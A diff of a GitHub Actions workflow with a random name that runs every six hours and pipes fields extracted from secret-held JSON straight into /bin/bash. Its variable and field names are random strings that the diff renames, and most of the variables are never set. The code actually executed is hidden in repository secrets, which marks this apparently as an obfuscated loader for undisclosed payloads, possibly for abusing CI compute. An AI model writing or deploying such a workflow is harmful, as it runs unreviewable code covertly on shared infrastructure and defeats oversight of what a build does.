@@ -2,24 +2,22 @@ name: yewuqucac
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
-jobs:  # 15593
+    - cron: '33 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yewuqucac
         env:
-          l15314: ${{ secrets.l15314 }}
+          iltew2: ${{ secrets.iltew2 }}
         run: |
-          echo $l15314 | jq -r .so2423 | /bin/bash
-          echo $mrc17517 | jq -r .pslea6 | /bin/bash
-          echo $esx4020 | jq -r .x280 | /bin/bash
-          echo $bh6586 | jq -r .yx30 | /bin/bash
-          echo $adtl7 | jq -r .ru38007 | /bin/bash
-          echo $zvbt89 | jq -r .qymf50 | /bin/bash
-          echo $t1218 | jq -r .laego329 | /bin/bash
-          echo $o164 | jq -r .kng60055 | /bin/bash
-          echo $kvdx82915 | jq -r .s13 | /bin/bash
+          echo $iltew2 | jq -r .qgq2824 | /bin/bash
+          echo $nfjxg51191 | jq -r .rexsd4928 | /bin/bash
+          echo $dcn97 | jq -r .bzhtr56688 | /bin/bash
+          echo $iikb65 | jq -r .n51966 | /bin/bash
+          echo $sxip9 | jq -r .lehae2 | /bin/bash
+          echo $hl464 | jq -r .goo5018 | /bin/bash
+          echo $qb7 | jq -r .xbct1 | /bin/bash
 
